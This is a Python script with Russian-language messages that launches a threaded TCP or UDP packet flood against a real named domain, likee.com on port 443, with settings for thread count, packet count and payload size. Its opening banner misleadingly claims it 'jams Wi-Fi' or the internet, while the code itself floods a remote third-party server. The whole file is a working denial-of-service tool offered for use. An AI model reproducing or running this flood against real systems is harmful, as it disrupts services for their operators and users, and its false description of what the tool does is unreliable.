import socket
import threading
import time
import random
import colorama
from colorama import Fore
import os


os.system("clear")


colorama.init()

print (Fore.YELLOW + "")


print ("Глушит интернет, используёте на свой страх и риск")

print ("")

wificraker = input("Нажмите Enter чтобы глушить wifi")
print ("Глушим wifi")

time.sleep(1)
#hello world





# Настройки 
TARGET_HOST = "likee.com"  # Замените на целевой домен
TARGET_PORT = 443  # Замените на целевой порт (80 для HTTP, 443 для HTTPS)
NUM_THREADS = 10  # Количество потоков
PACKETS_PER_THREAD = 1000 # Количество пакетов на поток
PAYLOAD_SIZE = 5024  # Размер п0олезной нагрузки (в байтах)
USE_UDP = False # True для UDP, False для TCP

# Функция для отправки TCP пакетов
def tcp_flood(host, port, packets_per_thread, payload_size):
    for i in range(packets_per_thread):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, port))
            payload = b"A" * payload_size  # Создаем полезную нагрузку
            sock.sendall(payload)
            sock.close()
            print(f"TCP: Отправлен пакет {i+1}")
            os.system("clear")
        except socket.error as e:
            print(f"TCP: Ошибка сокета: {e}")
            os.system("clear")
            break
        except Exception as e:
        
            print(f"TCP: Другая ошибка: {e}")
            os.system("clear")
            break
        time.sleep(0.01) # Небольшая задержка, чтобы не перегрузить систему

# Функция для отправки UDP пакетов
def udp_flood(host, port, packets_per_thread, payload_size):
    for i in range(packets_per_thread):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"B" * payload_size  # Создаем полезную нагрузку
            sock.sendto(payload, (host, port))
            print(f"UDP: Отправлен пакет {i+1}")
        except socket.error as e:
            print(f"UDP: Ошибка сокета: {e}")
            break
        except Exception as e:
            print(f"UDP: Другая ошибка: {e}")
            break
        time.sleep(0.01) # Небольшая задержка, чтобы не перегрузить систему

# Основная функция
def main():
    threads = []
    print(f"Начинаем отправку пакетов на {TARGET_HOST}:{TARGET_PORT}...")

    for i in range(NUM_THREADS):
        if USE_UDP:
            thread = threading.Thread(target=udp_flood, args=(TARGET_HOST, TARGET_PORT, PACKETS_PER_THREAD, PAYLOAD_SIZE))
            print(f"Запущен UDP поток {i+1}")
        else:
            thread = threading.Thread(target=tcp_flood, args=(TARGET_HOST, TARGET_PORT, PACKETS_PER_THREAD, PAYLOAD_SIZE))
            print(f"Запущен TCP поток {i+1}")

        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print("Отправка пакетов завершена.")
    print ("Закрываю программу")
    exit()

if __name__ == "__main__":
    main()
#the end



    
